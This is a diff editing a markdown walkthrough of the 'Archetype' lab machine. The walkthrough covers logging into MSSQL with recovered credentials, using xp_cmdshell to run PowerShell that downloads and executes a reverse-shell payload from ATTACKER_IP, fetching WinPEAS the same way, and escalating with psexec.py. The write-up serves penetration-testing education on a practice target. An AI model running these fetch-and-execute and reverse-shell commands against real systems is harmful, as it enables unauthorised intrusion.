@@ -76,7 +76,11 @@ mssqlclient.py
 
 After doing some research online, I came across this useful [information](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15):
 
+---
+
 *xp_cmdshell spawns a Windows command shell and passes in a string for execution. Any output is returned as rows of text.*
+
+---
 
 Extended stored procedure: **xp_cmdshell**
 
@@ -94,15 +98,13 @@ Let's log into the MSSQL server using the **mssqlclient.py** script from impacke
 
 *(Steps on how to do so can be found from [here](https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server))*
 
-From the config file earlier, we know that the username is:
+From the config file earlier, we got the following set of credentials: 
 
-> sql_svc 
+> sql_svc : M3g4c0rp123
 
-And the password is:
+Also, from our nmap scan, we also know that the domain name is:
 
-> M3g4c0rp123
-
-Also, from our nmap scan, we also know that the domain name is **ARCHETYPE**.
+> ARCHETYPE
 
 With that, we can log into the MSSQL server:
 
@@ -145,7 +147,7 @@ xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://ATTACKER_I
 This command does a few things:
 
 1. It uses powershell and the `-c` option to run the subsequent commands.
-2. It first navigates to **C:\Users\sql_svc\Downloads** as that is a directory which is writeable by us.
+2. It first navigates to `C:\Users\sql_svc\Downloads` as that is a directory which is writeable by us.
 3. It then uses `wget` to download our generated reverse shell payload from our local machine. Make sure to have a HTTP server up and running first.
 4. Finally, it executes the reverse shell script, thus opening up the reverse shell.
 
@@ -154,7 +156,7 @@ With a netcat listener up and running, we soon gain access into the target machi
 
 ![screenshot8](../assets/images/archetype/screenshot8.png)
 
-Now that we're in, let's download **WinPEAS** onto the target machine (make sure to have a HTTP server running).
+Now that we're in, let's download WinPEAS onto the target machine (make sure to have a HTTP server running).
 
 ```
 powershell -c wget http://ATTACKER_IP:8000/winPEASx86.exe -outfile winpeas.exe
@@ -186,7 +188,7 @@ python3 psexec.py administrator@10.129.82.74
 
 ![screenshot11](../assets/images/archetype/screenshot11.png)
 
-And just like that, we're now in the machine as **NT AUTHORITY\SYSTEM**!
+And just like that, we're now in the machine as the administrator!
 
 We can grab the **user flag** from the desktop of the **sql_svc** user:
 
